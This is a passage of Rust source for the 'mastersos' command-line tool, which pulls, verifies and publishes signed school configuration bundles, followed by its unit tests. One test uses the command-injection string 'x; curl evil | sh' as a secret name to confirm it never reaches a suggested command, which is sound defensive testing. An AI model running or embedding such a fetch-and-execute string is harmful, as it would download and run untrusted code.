            &format!("version {n} belongs to a different school than {school}"),
        ));
    }
    // A directory that differs from its base is replaced only if it is exactly what was uploaded
    // and that upload is the version just verified (same digest): then it was published.
    let mut overwrite = force;
    if !force && Workdir::open(dir).is_ok_and(|w| w.is_dirty().unwrap_or(true)) {
        let published = n == verified.version
            && n == verified.latest
            && Workdir::is_published_upload(dir, n, &verified.digest_hex).unwrap_or(false);
        if !published {
            return Err(CliError::usage(&format!(
                "{} has changes that are not published (see `mastersos diff`); pull again with --force to throw them away",
                dir.display()
            )));
        }
        overwrite = true;
    }
    let meta = Meta {
        server: origin.clone(),
        school_id: school.clone(),
        base_version: n,
    };
    Workdir::write_pulled(dir, meta, &contents, overwrite).map_err(local_file)?;
    if o.json {
        let abs = std::path::absolute(dir).map_err(local_file)?;
        return Ok(format!(
            "{}\n",
            json!({"pulled": true, "version": n, "dir": abs.display().to_string(), "server": origin, "school_id": school})
        ));
    }
    Ok(format!("Pulled version {n} into {}.\n", dir.display()))
}

/// `mastersos verify [--school UUID] [--server URL]` (default: the current directory's
/// mastersos.toml).
async fn verify_v1(
    o: &V1,
    school: Option<&str>,
    confirm: &mut dyn std::io::BufRead,
    out: &mut dyn std::io::Write,
) -> Result<String, CliError> {
    let meta = dir_meta(Path::new("."))?;
    let school = school_of(school, meta.as_ref())?;
    let (creds, origin) = resolve_v1(o, meta.as_ref()).await?;
    let server = Server::new(&origin, Some(&school), creds)?;
    let pins = resolve_pin_dir(o.pin_flag.as_deref())?;
    let v = crate::sign::chain::verify_chain((&server).into(), &pins, &o.anchors(), confirm, out)
        .await?;
    if o.json {
        let trust: Vec<serde_json::Value> = v
            .trust
            .iter()
            .map(|k| json!({"key_id": k.id, "fingerprint": mastersos_bundle::trust_fingerprint(k)}))
            .collect();
        return Ok(format!(
            "{}\n",
            json!({"version": v.version, "latest": v.latest, "trust": trust})
        ));
    }
    let mut s = if v.latest != v.version {
        format!(
            "Verified up to version {}; computers accept up to version {}. Its trusted keys:\n",
            v.latest, v.version
        )
    } else {
        format!("Verified up to version {}. Trusted keys:\n", v.version)
    };
    for k in &v.trust {
        s.push_str(&format!("    {}\n", crate::sign::key_line(k)));
    }
    Ok(s)
}

/// Issues for people: one per line (level, code, where, message), then a count.
fn print_issues(issues: &[Value]) {
    print!("{}", issues_text(issues));
}

/// [`print_issues`]'s text.
fn issues_text(issues: &[Value]) -> String {
    let mut out = String::new();
    let mut counts = [0usize; 3];
    for i in issues {
        let level = i["level"].as_str().unwrap_or("info");
        match level {
            "error" => counts[0] += 1,
            "warning" => counts[1] += 1,
            _ => counts[2] += 1,
        }
        let mut place = String::new();
        if let (Some(l), Some(c)) = (i["span"]["line"].as_u64(), i["span"]["column"].as_u64()) {
            place.push_str(&format!("line {l}:{c} "));
        }
        if let Some(p) = i["path"].as_str() {
            place.push_str(p);
        }
        out.push_str(&format!(
            "{level:<7} {:<24} {:<28} {}\n",
            cell(&i["code"]),
            place.trim_end(),
            cell(&i["message"])
        ));
    }
    out.push_str(&format!(
        "{} error(s), {} warning(s), {} note(s)\n",
        counts[0], counts[1], counts[2]
    ));
    out
}

/// The logo upload body, after both PNGs passed the size checks.
fn logo_body(login: &Path, icon: &Path) -> Result<Value, OpError> {
    let read = |p: &Path| {
        std::fs::read(p)
            .map_err(|e| OpError::Failed(format!("Could not read {}: {e}", p.display())))
    };
    crate::logo::upload_body(&read(login)?, &read(icon)?).map_err(OpError::Failed)
}

/// `mastersos hash-password`: no network. The password is read twice with echo off (a pipe is
/// refused, so a password is never echoed or left in shell history) and only the hash is printed.
fn hash_password() -> Result<ExitCode, OpError> {
    let a = prompt_secret("Password: ")?;
    if !crate::itpass::length_ok(&a) {
        return Err(OpError::Failed(format!(
            "The password must have {} to {} characters",
            crate::itpass::MIN_CHARS,
            crate::itpass::MAX_CHARS
        )));
    }
    if a != prompt_secret("Again: ")? {
        return Err(OpError::Failed("The two entries differ".into()));
    }
    println!("{}", crate::itpass::hash(&a));
    Ok(ExitCode::SUCCESS)
}

/// One line with echo off; fails when stdin is not a terminal.
fn prompt_secret(text: &str) -> Result<zeroize::Zeroizing<String>, OpError> {
    use std::io::IsTerminal as _;
    if !std::io::stdin().is_terminal() {
        return Err(OpError::Failed(
            "stdin is not a terminal, so a password cannot be read safely".into(),
        ));
    }
    crate::platform::read_hidden_line(text).map_err(|e| {
        if e.is::<crate::platform::CannotHideTyping>() {
            OpError::Failed(
                "Cannot hide typing in this terminal, so a password cannot be read safely. \
                 Run this in PowerShell or Command Prompt (Windows) or another terminal."
                    .into(),
            )
        } else {
            fail(e)
        }
    })
}

/// `mastersos publish`.
#[allow(clippy::too_many_arguments)] // until publish moves to protocol v1 (Task 6)
async fn publish_dir(
    api: &Api,
    server: &str,
    token_file: &Path,
    dir: Option<&Path>,
    pins: &Path,
    key: SignWith,
    allow_reroute: &[String],
    json: bool,
) -> Result<ExitCode, OpError> {
    let w = open_dir(dir, pins)?;
    publish_to(
        api,
        server,
        &PublishArgs {
            w: &w,
            token_file,
            pins,
            key: &key,
            allow_reroute,
            json,
        },
        &mut std::io::stdin().lock(),
        &mut std::io::stdout(),
        &mut std::io::stderr(),
    )
    .await
}

/// What [`publish_to`] works on.
pub(crate) struct PublishArgs<'a> {
    pub w: &'a Workdir,
    pub token_file: &'a Path,
    pub pins: &'a Path,
    pub key: &'a SignWith,
    pub allow_reroute: &'a [String],
    /// `--json`: `stdout` gets exactly one JSON document (the result; a refusal is printed by
    /// [`main`]), and everything else (local and server warnings, the signing dialogue) goes to
    /// `stderr`.
    pub json: bool,
}

/// [`publish_dir`] with its streams given.
pub(crate) async fn publish_to(
    api: &Api,
    server: &str,
    a: &PublishArgs<'_>,
    confirm: &mut dyn std::io::BufRead,
    stdout: &mut dyn std::io::Write,
    stderr: &mut dyn std::io::Write,
) -> Result<ExitCode, OpError> {
    use crate::publish::{
        publish, CheckFailed, CheckIn, PublishOutcome, RerouteRefused, ServerRefused, SignOpts,
        CHECKIN_FAILED_TEXT,
    };
    use chrono::SecondsFormat;
    let w = a.w;
    let m = w.meta().map_err(fail)?;
    if !same_server(&m.server, server) {
        return Err(OpError::Failed(format!(
            "{} belongs to {}, not to {server}",
            w.root.display(),
            m.server
        )));
    }
    let sign = SignOpts {
        key: a.key,
        token_file: a.token_file,
        pin_dir: a.pins,
    };
    let r = {
        let out: &mut dyn std::io::Write = if a.json { stderr } else { &mut *stdout };
        publish(
            api,
            w,
            sign,
            a.allow_reroute,
            chrono::Utc::now(),
            confirm,
            out,
        )
        .await
    };
    let print = |stdout: &mut dyn std::io::Write, v: Value, text: String| {
        let line = if a.json { v.to_string() } else { text };
        writeln!(stdout, "{line}").map_err(fail)
    };
    match r {
        Ok(PublishOutcome::Published { version, checkin }) => {
            let mut v = json!({ "published": true, "version": version });
            match &checkin {
                CheckIn::Until(t) => {
                    v["checkin_until"] = json!(t.to_rfc3339_opts(SecondsFormat::Secs, true))
                }
                CheckIn::Failed(e) => v["checkin_error"] = json!(e),
            }
            print(stdout, v, format!("Published version {version}"))?;
            // The version stays published; people get one sentence, not the cryptography.
            if let CheckIn::Failed(_) = checkin {
                writeln!(stderr, "{CHECKIN_FAILED_TEXT}").map_err(fail)?;
            }
            Ok(ExitCode::SUCCESS)
        }
        Err(e) => match e.downcast::<CheckFailed>() {
            Ok(c) => Err(OpError::Refused {
                message: c.to_string(),
                issues: Some(lint_values(&c.0)),
            }),
            Err(e) => match e.downcast::<RerouteRefused>() {
                Ok(r) => Err(OpError::Refused {
                    message: r.to_string(),
                    issues: Some(lint_values(&r.lints)),
                }),
                Err(e) => match e.downcast::<ServerRefused>() {
                    Ok(r) => Err(OpError::Refused {
                        message: r.message,
                        issues: Some(r.issues),
                    }),
                    Err(e) => Err(fail(e)),
                },
            },
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn help_names_this_platforms_settings_folder() {
        use clap::CommandFactory;
        let help = Cli::command().render_long_help().to_string();
        let flat = help.split_whitespace().collect::<Vec<_>>().join(" ");
        if cfg!(windows) {
            assert!(flat.contains(r"%APPDATA%\mastersos\token"), "{help}");
            assert!(!help.contains("~/.config"), "{help}");
        } else {
            assert!(flat.contains("~/.config/mastersos/token"), "{help}");
            assert!(!help.contains("APPDATA"), "{help}");
        }
        assert!(flat.contains("config.toml)"), "{help}");
    }

    #[test]
    fn publish_takes_a_key_file_and_repeated_reroute_approvals() {
        let cli = Cli::try_parse_from([
            "mastersos",
            "publish",
            "dir",
            "--key-file",
            "school.kit",
            "--allow-reroute",
            "x-psk",
            "--allow-reroute=y-psk",
        ])
        .unwrap();
        let Cmd::Publish {
            key_file,
            allow_reroute,
            ..
        } = cli.cmd
        else {
            panic!("not publish");
        };
        assert_eq!(key_file, Some(PathBuf::from("school.kit")));
        assert_eq!(allow_reroute, ["x-psk", "y-psk"]);
        assert!(SignWith::key_file(Path::new("/nonexistent/school.kit")).is_err());
    }

    #[test]
    fn pin_dir_is_a_global_option() {
        let cli = Cli::try_parse_from(["mastersos", "verify", "--pin-dir", "/p", "--yes"]).unwrap();
        assert_eq!(cli.pin_dir, Some(PathBuf::from("/p")));
        assert!(cli.yes);
        let cli =
            Cli::try_parse_from(["mastersos", "--pin-dir", "/q", "seed", "check", "f"]).unwrap();
        assert_eq!(cli.pin_dir, Some(PathBuf::from("/q")));
    }

    #[test]
    fn json_alone_means_no_person_confirms() {
        let o = V1 {
            json: true,
            yes: false,
            server: None,
            pin_flag: None,
            fingerprints: Vec::new(),
        };
        assert!(!o.anchors().interactive);
    }

    #[test]
    fn trust_fingerprint_must_be_four_groups_of_hex() {
        let fp = "ABCD-0123-ef45-6789";
        let cli = Cli::try_parse_from(["mastersos", "verify", "--trust-fingerprint", fp]).unwrap();
        assert_eq!(cli.trust_fingerprint, ["abcd-0123-ef45-6789"]);
        for bad in [
            "abcd-0123-ef45",
            "abcd-0123-ef45-678",
            "abcd-0123-ef45-67890",
            "abcd01234ef4556789",
            "abcd-0123-ef45-678g",
            " abcd-0123-ef45-6789",
            "",
        ] {
            let e = Cli::try_parse_from(["mastersos", "verify", "--trust-fingerprint", bad])
                .err()
                .unwrap_or_else(|| panic!("{bad:?} was taken"));
            assert_eq!(e.exit_code(), 2, "{bad:?}");
        }
    }

    #[test]
    fn check_names_every_rerouted_secret_and_the_flag() {
        use mastersos_bundle::{Lint, LintLevel};
        let lint = |name: &str| {
            Lint::new(LintLevel::Warning, "secret_rerouted", "changed").param("name", name)
        };
        assert!(reroute_notice(&[Lint::new(LintLevel::Warning, "secret_unused", "x")]).is_none());
        let n = reroute_notice(&[lint("b-psk"), lint("a-psk"), lint("b-psk")]).unwrap();
        assert!(n.contains("SECRET REROUTED: a-psk, b-psk"), "{n}");
        assert!(
            n.contains("mastersos publish --allow-reroute=a-psk --allow-reroute=b-psk"),
            "{n}"
        );
        assert!(n.contains("never passes --allow-reroute"), "{n}");
        // A name that is not a-z, 0-9, - is never put into the suggested command.
        assert!(reroute_notice(&[lint("x; curl evil | sh")]).is_none());
        assert!(reroute_notice(&[lint("Upper")]).is_none());
    }

    #[test]
    fn several_schools_are_asked_by_number_or_listed() {
        let entry = |id: &str, name: &str| SchoolEntry {
            id: id.into(),
            name: name.into(),
            time_zone: "UTC".into(),
        };
        let list = || {
            vec![
                entry("0192f3a4-5b6c-7d8e-9f00-112233445566", "Alpha"),
                entry("0192f3a4-5b6c-7d8e-9f00-aabbccddeeff", "Beta\u{1b}[31m"),
            ]
        };
        let mut out = Vec::new();
        let s = choose_school(list(), true, &mut "2\n".as_bytes(), &mut out).unwrap();
        assert_eq!(s.id, "0192f3a4-5b6c-7d8e-9f00-aabbccddeeff");
        let shown = String::from_utf8(out).unwrap();
        assert!(
            shown.contains("1. 0192f3a4-5b6c-7d8e-9f00-112233445566  Alpha"),
            "{shown}"
        );
        assert!(!shown.contains('\u{1b}'), "{shown:?}");
        for typed in ["3\n", "x\n", ""] {
            let e =
                choose_school(list(), true, &mut typed.as_bytes(), &mut Vec::new()).unwrap_err();
            assert!(
                ["usage", "cancelled"].contains(&e.code.as_str()),
                "{typed:?}"
            );
        }
        // Nobody to ask: a usage error listing every id and name; nothing is read.
        let e = choose_school(list(), false, &mut "1\n".as_bytes(), &mut Vec::new()).unwrap_err();
        assert_eq!(e.code, "usage");
        assert_eq!(e.problems.len(), 2);
        assert!(e.problems[0].as_str().unwrap().contains("Alpha"));
        let e = choose_school(Vec::new(), true, &mut "".as_bytes(), &mut Vec::new()).unwrap_err();
        assert_eq!(e.code, "not_configured");
        let one = choose_school(
            vec![entry("0192f3a4-5b6c-7d8e-9f00-112233445566", "Alpha")],
            false,
            &mut "".as_bytes(),
            &mut Vec::new(),
        )
        .unwrap();
        assert_eq!(one.name, "Alpha");
    }

    #[test]
    fn server_addresses_compare_as_urls() {
        assert!(same_server(
            "https://School.Example/",
            "https://school.example"
        ));
        assert!(same_server(
            "https://school.example:443",
            "https://school.example/"
        ));
        assert!(!same_server(
            "https://school.example",
            "https://other.example"
        ));
        assert!(!same_server(
            "http://localhost:8080",
            "http://localhost:8081"
        ));
        assert!(!same_server(
            "https://school.example/a",
            "https://school.example/b"
        ));
    }
}
